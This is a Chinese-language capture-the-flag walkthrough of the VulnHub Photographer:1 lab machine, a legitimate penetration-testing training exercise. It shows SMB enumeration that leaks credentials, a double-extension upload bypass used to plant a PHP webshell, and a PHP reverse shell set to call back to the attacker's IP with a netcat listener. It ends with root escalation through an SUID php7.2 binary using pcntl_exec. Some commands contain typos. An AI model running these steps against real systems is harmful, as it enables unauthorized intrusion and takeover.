VulnHub-Photographer:1#

靶机地址：https://www.vulnhub.com/entry/photographer-1,519/

0x00 环境#

攻击主机：Kali    IP：172.16.152.199

目标主机：Ubuntu    IP：172.16.152.229

使用工具：

  • nmap
  • netdiscover
  • dirb
  • nikto
  • enum4linxu

0x01 信息收集#

主机发现#

使用netdiscover -r 172.16.152.1/24扫描本网段主机。得到目标主机IP：172.16.152.229

端口扫描#

发现445、80、8000、139端口。有两个samba服务，使用enum4linux 172.16.152.229，samba账号密码为空。

使用smbclient连接smb服务器。能看到文件夹里有mailsent.txt和wordpress.bkp.zip两个文件。

下载mailsent.txt文件查看一下，是一封邮件，暂且放在一边。

记录一下email.txt内有可能有用的内容
4129F3CA.2020509@dc.edu
agi@photographer.com
daisa@photographer.com
babygirl

目录扫描#

分别访问两个web端口。80端口是静态页面，8000端口类似展示页面，但是注意到时koken cms。

分别使用dirb、gobuster、dirmap和dirsearch等扫描工具对目标IP进行目录扫描。

0x02 漏洞利用#

80端口的web服务没有什么能利用的，8000有个登录界面。

想到上面在smb下载的email.txt文件里面的信息，尝试登录。使用账号密码：“daisa@photographer.com/babygirl”可登录进入后台。

有上传点，尝试一下上传php后缀文件，提示不允许上传，bp无数据包，判断是前端验证。创建一个一句话木马，命名为“test.php.jpg”。上传时用bp拦截数据包并进行如下操作修改数据包。

getshell#

蚁剑成功连接。尝试上传kali自带的反弹shell。使用命令cp /usr/share/webshells/php/php-reverse-shell.php ./phprev.php.jpg复制反弹shell，并修改里面的监听IP和Port。

set_time_limit (0);
$VERSION = "1.0";
$ip = '172.16.152.199';  // CHANGE THIS
$port = 8889;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

利用上面上传webshell的方式上传反弹shell。kali使用命令nc -lvnp 8889监听8899端口，访问反弹shell。

获取交互式shell：python3 -c 'import pty;pty.spawn("/bin/bash")'

提权#

利用find命令来查找拥有suid访问权限的程序：find / -perm -u=s -tpye f 2>/dev/null

php7.2有权限，尝试用exec执行命令：/usr/bin/php7.2 -r "exec('whoami');"，好像执行不了，尝试用pcntl_exec函数：/usr/bin/php7.2 -r "pcntl_exec{'/bin/bash',['-p']);"，拿到root权限。

最终拿到指定文件。
